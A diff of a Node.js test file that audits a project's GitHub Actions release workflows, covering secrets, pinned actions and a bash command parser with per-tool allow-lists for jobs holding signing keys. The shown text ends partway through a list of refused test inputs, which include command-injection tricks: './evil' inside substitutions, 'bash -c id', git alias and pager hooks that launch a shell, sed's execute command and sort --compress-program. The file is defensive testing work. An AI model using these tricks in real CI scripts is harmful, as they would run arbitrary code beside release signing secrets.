@@ -16,8 +16,11 @@
  * The main ruleset requires checks by name, and a job reports its check under
  * its own name, so each required check must be exactly one job, in a workflow
  * that runs on every pull request. The PR title check also reruns when a
- * title is edited, and the Linux clippy job installs the packages that
- * CONTRIBUTING.md lists.
+ * title is edited, and allows exactly the types release-please files under a
+ * changelog section (release-please-config.json), shown or hidden. The Linux
+ * clippy job installs the packages that CONTRIBUTING.md lists. CI checks that
+ * the files holding the version agree (check-versions.mjs) right after the
+ * script tests, and the documented gate lists say so.
  *
  * The workflows that make a release (build.yml, smoke.yml, release-dry-run.yml
  * and release.yml) pin each action to a commit and grant only `contents:
@@ -26,10 +29,29 @@
  * Tauri CLI, system tools and the repository's scripts, get the release
  * secrets only in release-only steps, and check every artifact they take
  * before using it. A release build gets nothing of a dry run's: no cache,
- * none of the keys a dry run makes, no updater overlay. The dry run assembles with each build's own
- * key, and its smoke runs the bundles without the source tree. Where a step's
- * script decides something, such as the environment or the arguments the
- * smoke gets, the check runs that script with bash, as the runner does.
+ * none of the keys a dry run makes, no updater overlay. The dry run assembles
+ * with each build's own key and adds the install scripts, and its smoke runs
+ * the bundles without the source tree, then installs each platform's bundle
+ * with its install script, from the release as a local server serves it.
+ * Where a step's script decides something, such as the environment or the
+ * arguments the smoke gets, the check runs that script with bash, as the
+ * runner does. No job hands a workflow it calls any secret: build.yml's keyed
+ * jobs take theirs from the environment they name.
+ *
+ * release.yml runs on pushes to main alone, one run at a time, none
+ * cancelled. Its release-please, assemble and publish jobs are the only jobs
+ * that read the Release Bot's key, in the release-bot environment. Each makes
+ * the bot's token, which every gh command gets in place of the workflow's own
+ * token, and they run nothing but the actions, gh, git, curl and release
+ * scripts they need. release-please runs twice, the release alone, then the
+ * release pull request alone, which waits while a draft is pending. The
+ * release builds and smoke-tests the commit release-please's draft points
+ * at. assemble attests the assembled files in a job of release.yml itself,
+ * uploads them only to a draft, and checks that the draft holds exactly
+ * those bytes. publish, once assemble and smoke have passed, checks that the
+ * draft's commit is the one built and that its tag doesn't exist yet before
+ * it publishes. Candidate and release builds compare the macOS designated
+ * requirement with the pinned one.
  *
  * Node has no YAML parser and the repo takes no dependency for a test, so the
  * workflows are parsed by Python's PyYAML, as in check-github-config.test.mjs.
@@ -41,6 +63,7 @@
 import { describe, test } from "node:test";
 import assert from "node:assert/strict";
 import { spawnSync } from "node:child_process";
+import { createHash } from "node:crypto";
 import { copyFileSync, existsSync, mkdirSync, mkdtempSync, readdirSync, readFileSync, rmSync, statSync, writeFileSync } from "node:fs";
 import { tmpdir } from "node:os";
 import { basename, dirname, join } from "node:path";
@@ -49,7 +72,7 @@ import { isDeepStrictEqual } from "node:util";
 
 import { compiledFiles } from "../release/compiled-tar.mjs";
 import { dryRunConfig } from "../release/dry-run-config.mjs";
-import { TARGETS, UPDATER_KEY_ID, unsignedAssets, updaterAssets } from "../release/release-assets.mjs";
+import { INSTALL_SCRIPTS, TARGETS, UPDATER_KEY_ID, expectedAssets, unsignedAssets, updaterAssets } from "../release/release-assets.mjs";
 
 const ROOT = fileURLToPath(new URL("../../", import.meta.url));
 const WORKFLOWS = ".github/workflows";
@@ -515,10 +538,40 @@ describe("required checks", () => {
   });
 });
 
+describe("PR titles", () => {
+  // A squash-merged title becomes a commit on main, which release-please
+  // files under its type's changelog section. Each type a title may use has a
+  // section, shown or hidden, and each section is one a title can reach.
+  yamlTest("the PR title check allows exactly the types of release-please's changelog sections", () => {
+    const rel = `${WORKFLOWS}/pr-title.yml`;
+    const checks = Object.values(load(rel).jobs ?? {})
+      .flatMap((job) => job.steps ?? [])
+      .filter((step) => /^amannn\/action-semantic-pull-request@/.test(String(step.uses ?? "")));
+    assert.equal(checks.length, 1, `${rel} must run amannn/action-semantic-pull-request once`);
+    const allowed = String(checks[0].with?.types ?? "")
+      .split(/\s+/)
+      .filter(Boolean);
+    const sections = JSON.parse(read("release-please-config.json"))["changelog-sections"] ?? [];
+    assert.deepEqual(
+      [...allowed].sort(),
+      sections.map(({ type }) => type).sort(),
+      `${rel}'s types and release-please-config.json's changelog-sections must name the same types`,
+    );
+  });
+});
+
 // ── The release workflows ───────────────────────────────────────────────────
 
 const BUILD = `${WORKFLOWS}/build.yml`;
 const DRY_RUN = `${WORKFLOWS}/release-dry-run.yml`;
+const RELEASE = `${WORKFLOWS}/release.yml`;
+
+/**
+ * The macOS designated requirement of the release identity, pinned: a
+ * candidate's and a release's macOS checks compare the app's with it. A dry
+ * run signs with an identity made for the run, so it checks the shape only.
+ */
+const DR_FILE = "scripts/release/macos-designated-requirement.txt";
 
 /**
  * The workflows a release is made by. Their actions run next to the signing
@@ -685,6 +738,16 @@ describe("release workflows", () => {
     assert.deepEqual(found, [], `these workflows run on pull_request_target; use pull_request: ${found.join(", ")}`);
   });
 
+  yamlTest("no job hands a workflow it calls any secret, secrets: inherit least of all", () => {
+    // inherit would give every job of build.yml, compile's included, the
+    // repository's secrets; its keyed jobs take theirs from the environment
+    // they name.
+    const calls = workflowJobs().filter(({ job }) => typeof job.uses === "string");
+    assert.ok(calls.length > 0, "no job calls a workflow, so there was nothing to check");
+    const found = calls.filter(({ job }) => job.secrets !== undefined).map(({ rel, id, job }) => `${rel}, job ${id}: secrets: ${JSON.stringify(job.secrets)}`);
+    assert.deepEqual(found, [], found.join("\n"));
+  });
+
   yamlTest("the release workflows grant only contents: read at the top, and more per job only", () => {
     const problems = workflows()
       .filter(({ rel }) => RELEASE_PATH.includes(basename(rel)))
@@ -732,38 +795,102 @@ const commandLines = (step) =>
 /** Words that start or join a compound command, after which a command still comes. */
 const RESERVED_WORDS = new Set(["!", "{", "}", "case", "do", "done", "elif", "else", "esac", "fi", "for", "function", "if", "in", "select", "then", "time", "until", "while"]);
 
+/** A redirection's operator, after any file descriptor number, and a descriptor it duplicates. */
+const REDIRECT = /^(&>>|&>|<<<|<<-|<<|<&|>&|>>|>\||<>|<|>)(-|[0-9]+)?/;
+/** The redirections that write to their target. */
+const WRITES = new Set(["&>>", "&>", ">&", ">>", ">|", "<>", ">"]);
+
 /**
- * The simple commands a bash script runs, each as its words: quotes taken
- * off, leading NAME=value assignments and redirections left out, and the
- * commands inside $( ) and backquotes listed too. It reads enough of bash
- * for the workflows' scripts: quotes, escapes, ${ }, $(( )), $( ), ( ),
- * operators, redirections, reserved words, array assignments and function
- * definitions; a function's name shows as a command where it is defined.
+ * The simple commands a bash script runs, as { words, assignments,
+ * redirects } each: words with their quotes taken off; assignments, the
+ * NAME=value words before the command, as { name, value }; redirects, its
+ * redirections, as { op, target }. The commands inside $( ), <( ), >( ),
+ * backquotes, ${ } and $(( )) are listed too, wherever they are, and so are
+ * a function's; a function's name shows as a command where it is defined.
+ * It reads enough of bash for the workflows' scripts: quotes, escapes,
+ * expansions, substitutions, operators, redirections, reserved words and
+ * array assignments. A here-document's text isn't read; the rules refuse
+ * here-documents.
  *
  * @param {string} script
- * @returns {string[][]}
+ * @returns {{ words: string[], assignments: { name: string, value: string }[], redirects: { op: string, target: string }[] }[]}
  */
 function simpleCommands(script) {
   const commands = [];
   let i = 0;
-  /** From an opening bracket at i, the index just past its match, skipping quotes. */
-  const skipBalanced = (open, close) => {
-    let depth = 0;
-    for (; i < script.length; i += 1) {
-      const c = script[i];
-      if (c === "\\") i += 1;
-      else if (c === "'") i = script.indexOf("'", i + 1);
-      else if (c === open) depth += 1;
-      else if (c === close && (depth -= 1) === 0) return (i += 1);
-    }
-    return i;
+  /** Past a single-quoted string, from its opening quote. */
+  const skipSingle = () => {
+    const end = script.indexOf("'", i + 1);
+    i = end === -1 ? script.length : end + 1;
   };
-  /** A list of commands until `closer` (")" or "`"), or to the end. */
+  /**
+   * At a $( ), <( ), >( ), backquote, ${ } or $(( )), read past it, listing
+   * the commands inside: true; else false. <( and >( count where
+   * `processes`, outside double quotes.
+   */
+  const substitution = (processes) => {
+    if (script.startsWith("$((", i)) {
+      i += 3;
+      inside("))");
+    } else if (script.startsWith("$(", i) || (processes && (script.startsWith("<(", i) || script.startsWith(">(", i)))) {
+      i += 2;
+      list(")");
+    } else if (script.startsWith("${", i)) {
+      i += 2;
+      inside("}");
+    } else if (script[i] === "`") {
+      i += 1;
+      list("`");
+    } else {
+      return false;
+    }
+    return true;
+  };
+  /** Past the rest of a ${ } or $(( )), up to `close`, listing the commands of its substitutions. */
+  const inside = (close) => {
+    let depth = 0;
+    while (i < script.length) {
+      if (depth === 0 && script.startsWith(close, i)) {
+        i += close.length;
+        return;
+      }
+      const c = script[i];
+      if (c === "\\") i += 2;
+      else if (c === "'") skipSingle();
+      else if (c === '"') {
+        i += 1;
+        quoted();
+      } else if (!substitution(false)) {
+        if (close === "))" && c === "(") depth += 1;
+        else if (close === "))" && c === ")") depth -= 1;
+        i += 1;
+      }
+    }
+  };
+  /** Past the rest of a double-quoted string, from just inside it; its text, quotes off. */
+  const quoted = () => {
+    let text = "";
+    while (i < script.length && script[i] !== '"') {
+      const start = i;
+      if (script[i] === "\\") {
+        text += script[i + 1] ?? "";
+        i += 2;
+      } else if (substitution(false)) {
+        text += script.slice(start, i);
+      } else {
+        text += script[i];
+        i += 1;
+      }
+    }
+    i += 1;
+    return text;
+  };
+  /** A list of commands, up to `closer` (")" or "`"), or to the end. */
   const list = (closer) => {
-    let words = [];
+    let command = { words: [], assignments: [], redirects: [] };
     let word = null;
     let raw = "";
-    let target = false;
+    let op = null;
     let skipping = false;
     const add = (text, written = text) => {
       word = (word ?? "") + text;
@@ -771,56 +898,32 @@ function simpleCommands(script) {
     };
     const endWord = () => {
       if (word === null) return;
-      if (target) target = false;
-      else if (words.length === 0 && /^[A-Za-z_][A-Za-z0-9_]*(\[[^\]]*\])?\+?=/.test(raw)) {
-        // An assignment before the command.
-      } else if (words.length === 0 && RESERVED_WORDS.has(raw)) {
+      const assignment = /^([A-Za-z_][A-Za-z0-9_]*)(\[[^\]]*\])?\+?=/.exec(raw);
+      if (op !== null) {
+        command.redirects.push({ op, target: word });
+        op = null;
+      } else if (command.words.length === 0 && assignment) {
+        command.assignments.push({ name: assignment[1], value: word.slice(word.indexOf("=") + 1) });
+      } else if (command.words.length === 0 && RESERVED_WORDS.has(raw)) {
         // for and select name a variable and a list, not a command.
         if (raw === "for" || raw === "select") skipping = true;
-      } else if (!skipping) words.push(word);
+      } else if (!skipping) {
+        command.words.push(word);
+      }
       word = null;
       raw = "";
     };
     const endCommand = () => {
       endWord();
-      if (words.length > 0) commands.push(words);
-      words = [];
+      if (op !== null) command.redirects.push({ op, target: "" });
+      op = null;
+      if (command.words.length + command.assignments.length + command.redirects.length > 0) commands.push(command);
+      command = { words: [], assignments: [], redirects: [] };
       skipping = false;
-    };
-    /** The rest of a double-quoted string, from just past its opening quote. */
-    const quoted = () => {
-      while (i < script.length && script[i] !== '"') {
-        if (script[i] === "\\") {
-          add(script[i + 1] ?? "", script.slice(i, i + 2));
-          i += 2;
-        } else if (script.startsWith("$((", i)) {
-          const start = i;
-          i += 1;
-          skipBalanced("(", ")");
-          add(script.slice(start, i));
-        } else if (script.startsWith("$(", i)) {
-          i += 2;
-          list(")");
-          add("$(…)");
-        } else if (script.startsWith("${", i)) {
-          const start = i;
-          i += 1;
-          skipBalanced("{", "}");
-          add(script.slice(start, i));
-        } else if (script[i] === "`") {
-          i += 1;
-          list("`");
-          add("`…`");
-        } else {
-          add(script[i]);
-          i += 1;
-        }
-      }
-      i += 1;
     };
     while (i < script.length) {
       const c = script[i];
-      const rest = script.slice(i);
+      const start = i;
       if (closer !== undefined && c === closer) {
         endCommand();
         i += 1;
@@ -830,60 +933,57 @@ function simpleCommands(script) {
         if (script[i + 1] !== "\n") add(script[i + 1] ?? "", script.slice(i, i + 2));
         i += 2;
       } else if (c === "'") {
-        const end = script.indexOf("'", i + 1);
-        add(script.slice(i + 1, end), script.slice(i, end + 1));
-        i = end + 1;
+        skipSingle();
+        add(script.slice(start + 1, i - 1), script.slice(start, i));
       } else if (c === '"') {
         i += 1;
-        add("", '"');
-        quoted();
-      } else if (rest.startsWith("$((")) {
-        const start = i;
-        i += 1;
-        skipBalanced("(", ")");
-        add(script.slice(start, i));
-      } else if (rest.startsWith("$(")) {
-        i += 2;
-        list(")");
-        add("$(…)");
-      } else if (rest.startsWith("${")) {
-        const start = i;
-        i += 1;
-        skipBalanced("{", "}");
-        add(script.slice(start, i));
-      } else if (c === "`") {
-        i += 1;
-        list("`");
-        add("`…`");
+        const text = quoted();
+        add(text, script.slice(start, i));
       } else if (c === "#" && word === null) {
         const end = script.indexOf("\n", i);
         i = end === -1 ? script.length : end;
       } else if (c === "(" && word !== null && raw.endsWith("=")) {
-        // An array assignment's list.
-        const start = i;
-        skipBalanced("(", ")");
-        add(script.slice(start, i));
-      } else if (c === "(" || c === ")") {
-        endCommand();
+        // An array assignment's list, whose words can hold substitutions.
         i += 1;
-      } else if (/^[0-9]*(<<<|<<-?|<&|>&|>>|<>|<|>)/.test(rest) && (word === null || /^[0-9]+$/.test(raw))) {
-        if (word !== null) {
-          word = null;
-          raw = "";
+        while (i < script.length && script[i] !== ")") {
+          if (script[i] === "\\") i += 2;
+          else if (script[i] === "'") skipSingle();
+          else if (script[i] === '"') {
+            i += 1;
+            quoted();
+          } else if (!substitution(true)) i += 1;
         }
-        const [operator, , , fd] = /^([0-9]*)(<<<|<<-?|<&|>&|>>|<>|<|>)(-|[0-9]+)?/.exec(rest);
-        endWord();
-        i += operator.length;
-        target = fd === undefined;
-      } else if (c === "\n" || c === ";" || c === "&" || c === "|") {
-        endCommand();
-        i += /^(&&|\|\||;;|\|&)/.test(rest) ? 2 : 1;
-      } else if (c === " " || c === "\t") {
-        endWord();
         i += 1;
+        add(script.slice(start, i));
+      } else if (substitution(true)) {
+        add(script.slice(start, i));
       } else {
-        add(c);
-        i += 1;
+        const rest = script.slice(i);
+        const redirect = REDIRECT.exec(rest);
+        if (redirect) {
+          // A file descriptor's number before it belongs to the redirection.
+          if (word !== null && /^[0-9]+$/.test(raw)) {
+            word = null;
+            raw = "";
+          } else {
+            endWord();
+          }
+          i += redirect[0].length;
+          if (redirect[2] === undefined) op = redirect[1];
+          else command.redirects.push({ op: redirect[0], target: "" });
+        } else if (c === "(" || c === ")") {
+          endCommand();
+          i += 1;
+        } else if (c === "\n" || c === ";" || c === "&" || c === "|") {
+          endCommand();
+          i += /^(&&|\|\||;;|\|&)/.test(rest) ? 2 : 1;
+        } else if (c === " " || c === "\t") {
+          endWord();
+          i += 1;
+        } else {
+          add(c);
+          i += 1;
+        }
       }
     }
     endCommand();
@@ -895,55 +995,173 @@ function simpleCommands(script) {
 /** The names of the functions a script defines. */
 const definedFunctions = (script) => new Set([...script.matchAll(/^\s*([A-Za-z_][\w-]*)\s*\(\)\s*\{/gm)].map(([, name]) => name));
 
-/** The system tools a job with the keys may run, besides npx, npm, node and bash, which keyedProblem checks. */
-const KEYED_COMMANDS = new Set([
-  "[",
-  "base64",
-  "cd",
-  "chmod",
-  "codesign",
-  "cp",
-  "dirname",
-  "echo",
-  "exit",
-  "find",
-  "git",
-  "local",
-  "mkdir",
-  "printf",
-  "read",
-  "rm",
-  "rustup",
-  "sed",
-  "security",
-  "shift",
-  "sort",
-  "sw_vers",
-  "true",
-  "xattr",
+/** Whether two lists of words are the same. */
+const sameWords = (a, b) => a.length === b.length && a.every((word, n) => word === b[n]);
+
+/** A rule for a tool's arguments: one of these lists exactly. */
+const exactly =
+  (...forms) =>
+  (args) =>
+    forms.some((form) => sameWords(form, args)) ? null : `takes only ${forms.map((form) => (form.length > 0 ? form.join(" ") : "no argument")).join(", or ")}`;
+
+/** A rule for a tool's arguments: any. */
+const anything = () => null;
+
+/** A rule for arguments that name shell variables: lower-case names, which no tool reads, and -r. */
+const scriptVariables = (args) =>
+  args.every((arg) => arg === "-r" || /^[a-z_][a-z0-9_]*(=.*)?$/s.test(arg)) ? null : "sets a variable other than the script's own, lower-case ones";
+
+/**
+ * A rule for printf's arguments. -v makes it set a variable, which must be
+ * one of the script's own, lower-case ones, as read's and local's must. bash
+ * reads options before the format alone, until --, and takes -v's name
+ * either as the next argument or joined to it (-vname); printf has no other
+ * option. bash expands each word before printf reads it, so neither an
+ * option nor the format may hold an expansion, a $ or a backquote: "$o",
+ * with o=-vPATH, would set PATH.
+ */
+function printfRule(args) {
+  let n = 0;
+  for (; n < args.length && args[n].startsWith("-") && args[n] !== "--"; n += 1) {
+    if (/[$`]/.test(args[n])) return `takes ${args[n]}, an option an expansion makes`;
+    if (!args[n].startsWith("-v")) return `takes ${args[n]}, which isn't an option of printf`;
+    const name = args[n] === "-v" ? args[(n += 1)] : args[n].slice(2);
+    if (!/^[a-z_][a-z0-9_]*$/.test(name ?? "")) return "sets a variable other than the script's own, lower-case ones";
+  }
+  if (args[n] === "--") n += 1;
+  if (/[$`]/.test(args[n] ?? "")) return `takes ${args[n]} for its format, which an expansion makes, and which could be an option`;
+  return null;
+}
+
+/**
+ * A path with a node_modules, scripts, src-tauri or release folder in it,
+ * wherever: ./ and .. don't hide one, as each part is read. The first three
+ * hold what the job runs. A release folder holds what ships: release.yml's
+ * assembled release, which assemble attests and then uploads, or a target's
+ * release folder, whose binaries a job with the keys bundles.
+ */
+const PROTECTED_PATH = /(^|\/)(node_modules|scripts|src-tauri|release)(\/|$)/;
+
+/** The copies a job with the keys makes into the checkout: the hand-off's listed files, and the notices. */
+const KEYED_COPIES = [
+  ["-p", "$out/$file", "$file"],
+  ["$RUNNER_TEMP/notices/THIRD-PARTY-NOTICES", "THIRD-PARTY-NOTICES"],
+];
+
+/** The configs a job with the keys bundles with: the release's, and the dry run's overlay. */
+const KEYED_TAURI_CONFIGS = ["src-tauri/tauri.release.conf.json", "$RUNNER_TEMP/dry-run-config/dry-run.json"];
+
+/** The arguments tauri bundle may take in a job with the keys: flags and values the workflow passes. */
+function bundleArgsProblem(args) {
+  const seen = new Set();
+  for (let n = 0; n < args.length; n += 1) {
+    const [flag, value] = [args[n], args[n + 1]];
+    const valued = (flag === "--target" && value === "$TRIPLE") || (flag === "--bundles" && value === "$BUNDLES") || (flag === "--config" && KEYED_TAURI_CONFIGS.includes(value));
+    const key = flag === "--config" ? `${flag} ${value}` : flag;
+    if (!valued && flag !== "--verbose" && flag !== "--ci") return `passes tauri bundle ${flag}${value === undefined ? "" : ` ${value}`}, which these jobs don't`;
+    if (seen.has(key)) return `passes tauri bundle ${flag} twice`;
+    seen.add(key);
+    if (valued) n += 1;
+  }
+  return null;
+}
+
+/** The system tools a job with the keys may run, each with a rule for its arguments. */
+const KEYED_TOOLS = new Map([
+  ["[", anything],
+  ["base64", exactly(["--decode"])],
+  ["cd", anything],
+  ["chmod", anything],
+  ["codesign", anything],
+  ["cp", (args) => (KEYED_COPIES.some((form) => sameWords(form, args)) || (args.length === 2 && !args[0].startsWith("-") && args[1].startsWith("$RUNNER_TEMP/") && !args[1].split("/").includes("..")) ? null : "copies only into $RUNNER_TEMP, or the hand-off's listed files and the notices into the checkout")],
+  ["dirname", anything],
+  ["echo", anything],
+  ["exit", anything],
+  ["find", exactly(["$out", "!", "-type", "f", "!", "-type", "d"], [".", "-type", "f"])],
+  ["git", (args) => (["ls-files --others --", "diff --exit-code --"].includes(args.slice(0, 3).join(" ")) ? null : "takes only ls-files --others -- <paths> or diff --exit-code -- <paths>")],
+  ["local", scriptVariables],
+  ["mkdir", anything],
+  ["printf", printfRule],
+  ["read", scriptVariables],
+  ["rm", anything],
+  ["rustup", exactly(["toolchain", "install"], ["show", "active-toolchain"])],
+  ["sed", exactly(["-e", "s|^\\./||"])],
+  ["security", (args) => (["delete-keychain", "find-identity", "list-keychains"].includes(args[0]) ? null : "takes only delete-keychain, find-identity or list-keychains")],
+  ["shift", anything],
+  ["sort", exactly([])],
+  ["sw_vers", exactly([])],
+  ["true", exactly([])],
+  ["xattr", exactly(["-lr", "$app"])],
 ]);
 
 /**
- * Why a simple command may not run in a job with the keys, or null: only the
- * lockfile's Tauri CLI, to bundle or sign, npm ci --ignore-scripts, the
- * repository's scripts, the tools above and the script's own functions may.
+ * What a simple command's assignments and redirections do that a job with a
+ * key may not: set a variable a tool reads (PATH, GIT_*, LD_*, NODE_OPTIONS,
+ * …), as only lower-case names and those `allowed` may be set; write under
+ * node_modules, scripts, src-tauri or release (PROTECTED_PATH), or to
+ * $GITHUB_ENV or $GITHUB_PATH, which set later steps' environment, the steps
+ * of actions included; or use a here-document, which simpleCommands doesn't
+ * read.
  *
- * @param {string[]} words  the command, as simpleCommands gives it
- * @param {Set<string>} functions  the functions the script defines
+ * @param {{ name: string }[]} assignments
+ * @param {{ op: string, target: string }[]} redirects
+ * @param {string[]} allowed  the names besides lower-case ones that may be set
+ * @returns {string[]}
  */
-function keyedProblem([name, ...args], functions) {
-  if (name === "npx") {
-    if (args.slice(0, 3).join(" ") !== "--no -- tauri") return "runs npx other than as npx --no -- tauri";
-    // These jobs build nothing: they bundle what compile built, and sign.
-    return args[3] === "bundle" || args.slice(3, 5).join(" ") === "signer sign" ? null : `runs tauri ${args[3] ?? ""}, where these jobs only bundle and sign`;
+function settingProblems(assignments, redirects, allowed) {
+  const problems = [];
+  for (const assignment of assignments) {
+    if (!/^[a-z_][a-z0-9_]*$/.test(assignment.name) && !allowed.includes(assignment.name)) problems.push(`sets ${assignment.name}, which a tool can read`);
   }
-  if (name === "npm") return args.join(" ") === "ci --ignore-scripts" ? null : "runs npm other than as npm ci --ignore-scripts";
-  if (name === "node") return /^scripts\/release\/[\w-]+\.mjs$/.test(args[0] ?? "") ? null : "runs node on something other than a scripts/release/*.mjs file";
-  if (name === "bash") return args[0] === "scripts/release/macos-keychain.sh" ? null : "runs bash on something other than scripts/release/macos-keychain.sh";
-  if (name === "find" && args.some((arg) => /^-(exec|execdir|ok|okdir)$/.test(arg))) return "runs a command through find";
-  if (functions.has(name)) return null;
-  if (/[/$`]/.test(name)) return "runs a file by its path, or a command named by a variable";
-  return KEYED_COMMANDS.has(name) ? null : `runs ${name}, which isn't among the commands these jobs may run`;
+  for (const { op, target } of redirects) {
+    if (op === "<<" || op === "<<-") problems.push("uses a here-document, which this check doesn't read");
+    else if (WRITES.has(op) && (PROTECTED_PATH.test(target) || /^\$\{?GITHUB_(ENV|PATH)\}?$/.test(target))) problems.push(`writes to ${target}`);
+  }
+  return problems;
+}
+
+/**
+ * Why a simple command may not run in a job with the keys: none, when it may.
+ * Only these may run: the lockfile's Tauri CLI, to bundle with the flags the
+ * workflow passes or to sign; npm ci --ignore-scripts; node on
+ * scripts/release/*.mjs; bash on scripts/release/macos-keychain.sh; the
+ * tools above, with the arguments their rules allow; and the script's own
+ * functions. No assignment may set a variable a tool reads (PATH, GIT_*,
+ * LD_*, NODE_OPTIONS, …), and no redirection may write under node_modules,
+ * scripts or src-tauri, or to $GITHUB_ENV or $GITHUB_PATH, which set later
+ * steps' environment. A here-document isn't read, so it is refused.
+ *
+ * @param {{ words: string[], assignments: { name: string }[], redirects: { op: string, target: string }[] }} command
+ * @param {Set<string>} functions  the functions the script defines
+ * @returns {string[]}
+ */
+function keyedProblems({ words: [name, ...args], assignments, redirects }, functions) {
+  const problems = settingProblems(assignments, redirects, ["IFS", "LC_ALL", "P12"]);
+  if (name === undefined) return problems;
+  let why = null;
+  if (name === "npx") {
+    if (args.slice(0, 3).join(" ") !== "--no -- tauri") why = "runs npx other than as npx --no -- tauri";
+    else if (args[3] === "bundle") why = bundleArgsProblem(args.slice(4));
+    else if (args.slice(3, 5).join(" ") === "signer sign") {
+      const forms = [["$RUNNER_TEMP/bundles/$name"], ["-f", "$RUNNER_TEMP/dry-run/updater.key", "-p", "", "$RUNNER_TEMP/bundles/$name"]];
+      if (!forms.some((form) => sameWords(form, args.slice(5)))) why = "passes tauri signer sign arguments these jobs don't";
+    } else why = `runs tauri ${args[3] ?? ""}, where these jobs only bundle and sign`;
+  } else if (name === "npm") {
+    if (!sameWords(args, ["ci", "--ignore-scripts"])) why = "runs npm other than as npm ci --ignore-scripts";
+  } else if (name === "node") {
+    if (!/^scripts\/release\/[\w-]+\.mjs$/.test(args[0] ?? "")) why = "runs node on something other than a scripts/release/*.mjs file";
+  } else if (name === "bash") {
+    if (args[0] !== "scripts/release/macos-keychain.sh" || !["dry-run", "import"].includes(args[1]) || args.length !== 2) why = "runs bash other than as bash scripts/release/macos-keychain.sh dry-run or import";
+  } else if (!functions.has(name)) {
+    if (/[/$`]/.test(name)) why = "runs a file by its path, or a command named by a variable";
+    else if (!KEYED_TOOLS.has(name)) why = `runs ${name}, which isn't among the commands these jobs may run`;
+    else {
+      const rule = KEYED_TOOLS.get(name)(args);
+      if (rule !== null) why = `runs ${name}, which ${rule}`;
+    }
+  }
+  if (why !== null) problems.push(why);
+  return problems;
 }
 
 describe("build.yml", () => {
@@ -1011,7 +1229,7 @@ describe("build.yml", () => {
     const problems = [];
     for (const [id, job] of Object.entries(workflow(BUILD).jobs ?? {})) {
       for (const [i, step] of (job.steps ?? []).entries()) {
-        for (const words of simpleCommands(scriptOf(step))) {
+        for (const { words } of simpleCommands(scriptOf(step))) {
           const where = `${BUILD}, job ${id}, ${stepLabel(step, i)}: ${words.join(" ")}`;
           if (words[0] === "npm" && ["ci", "install", "i"].includes(words[1]) && !words.includes("--ignore-scripts")) problems.push(`${where} runs install scripts`);
           if (words[0] === "npx" && words.slice(1, 4).join(" ") !== "--no -- tauri") problems.push(`${where} runs npx other than as npx --no -- tauri`);
@@ -1110,9 +1328,8 @@ describe("build.yml", () => {
       for (const [i, step] of stepsOf(id).entries()) {
         if (step.shell !== undefined) problems.push(`job ${id}, ${stepLabel(step, i)} sets shell: ${step.shell}`);
         const functions = definedFunctions(scriptOf(step));
-        for (const words of simpleCommands(scriptOf(step))) {
-          const why = keyedProblem(words, functions);
-          if (why !== null) problems.push(`job ${id}, ${stepLabel(step, i)} ${why}: ${words.join(" ")}`);
+        for (const command of simpleCommands(scriptOf(step))) {
+          for (const why of keyedProblems(command, functions)) problems.push(`job ${id}, ${stepLabel(step, i)} ${why}: ${command.words.join(" ")}`);
         }
       }
     }
@@ -1121,36 +1338,57 @@ describe("build.yml", () => {
     assert.ok(stepsOf("bundle-macos").some(isTauriBundle), "bundle-macos doesn't run tauri bundle");
   });
 
-  test("simpleCommands finds each command a script runs, inside quotes and substitutions too", () => {
-    assert.deepEqual(
-      simpleCommands(`found=$(cd "$out" && find . -type f | sed -e 's|^\\./||' | LC_ALL=C sort)
+  test("simpleCommands finds each command a script runs, inside quotes, expansions and substitutions too", () => {
+    const script = `found=$(cd "$out" && find . -type f | sed -e 's|^\\./||' | LC_ALL=C sort)
 if [ "$found" != "$(LC_ALL=C sort <<< "$listed")" ]; then exit 1; fi
-while IFS= read -r name; do names+=("$name"); done <<< "$expected"
+while IFS= read -r name; do names+=("$name" "$(a)"); done <<< "$expected"
 mkdir -p "$(dirname "$file")"
 P12="$dir/release.p12" bash scripts/release/macos-keychain.sh import > "$out/x.txt" 2>&1 || status=$?
+x=\${y:-$(b)} n=$(( $(c) + 1 )) && echo "\${z:-\`d\`}"
+sort <(e) > >(f) < <(g)
 capture() {
   local name=$1
-}`),
+}`;
+    assert.deepEqual(
+      simpleCommands(script).map(({ words }) => words),
       [
         ["cd", "$out"],
         ["find", ".", "-type", "f"],
         ["sed", "-e", "s|^\\./||"],
         ["sort"],
+        [],
         ["sort"],
-        ["[", "$found", "!=", "$(…)", "]"],
+        ["[", "$found", "!=", '$(LC_ALL=C sort <<< "$listed")', "]"],
         ["exit", "1"],
         ["read", "-r", "name"],
+        ["a"],
+        [],
+        [],
         ["dirname", "$file"],
-        ["mkdir", "-p", "$(…)"],
+        ["mkdir", "-p", '$(dirname "$file")'],
         ["bash", "scripts/release/macos-keychain.sh", "import"],
+        [],
+        ["b"],
+        ["c"],
+        [],
+        ["d"],
+        ["echo", "${z:-`d`}"],
+        ["e"],
+        ["f"],
+        ["g"],
+        ["sort", "<(e)"],
         ["capture"],
         ["local", "name=$1"],
       ],
     );
+    const commands = simpleCommands(script);
+    assert.deepEqual(commands.find(({ words }) => words[0] === "bash").assignments, [{ name: "P12", value: "$dir/release.p12" }]);
+    assert.deepEqual(commands.find(({ words }) => words[0] === "bash").redirects, [{ op: ">", target: "$out/x.txt" }, { op: ">&1", target: "" }]);
+    assert.deepEqual(commands.find(({ words }) => words[0] === "sort" && words[1] === "<(e)").redirects, [{ op: ">", target: ">(f)" }, { op: "<", target: "<(g)" }]);
   });
 
   test("the rules for sign and bundle-macos refuse what they don't allow, and let through what those jobs run", () => {
-    const refused = (script) => simpleCommands(script).flatMap((words) => keyedProblem(words, definedFunctions(script)) ?? []);
+    const refused = (script) => simpleCommands(script).flatMap((command) => keyedProblems(command, definedFunctions(script)));
     for (const script of [
       "source ./env.sh",
       ". ./env.sh",
@@ -1192,12 +1430,81 @@ capture() {
       "x=$(node scripts/other.mjs)",
       "bash -c 'id'",
       "bash ./x.sh",
+      "bash scripts/release/macos-keychain.sh evil",
+      // Commands inside expansions and process substitutions.
+      "x=${y:-$(./evil)}",
+      "n=$(( $(./evil) ))",
+      'echo "${x:-$(./evil)}"',
+      "x=`./evil`",
+      'names=("$(./evil)")',
+      'while read -r x; do echo "$x"; done < <(./evil)',
+      "sort <(./evil)",
+      "echo x > >(./evil)",
+      // Tools that can run another program, with arguments the workflow doesn't pass.
+      "git -c alias.x='!sh' x",
+      "git -c core.pager=./evil diff --exit-code -- x",
+      "git diff --ext-diff",
+      "git ls-files --others --exclude-standard -- x",
+      "sed -e '1e ./evil'",
+      "sed -i -e 's/a/b/' scripts/release/x.mjs",
+      "sort --compress-program=./evil",
+      "rustup run stable ./evil",
+      "rustup toolchain install nightly",
+      "find . -type f -delete",
+      "security execute-with-privileges ./evil",
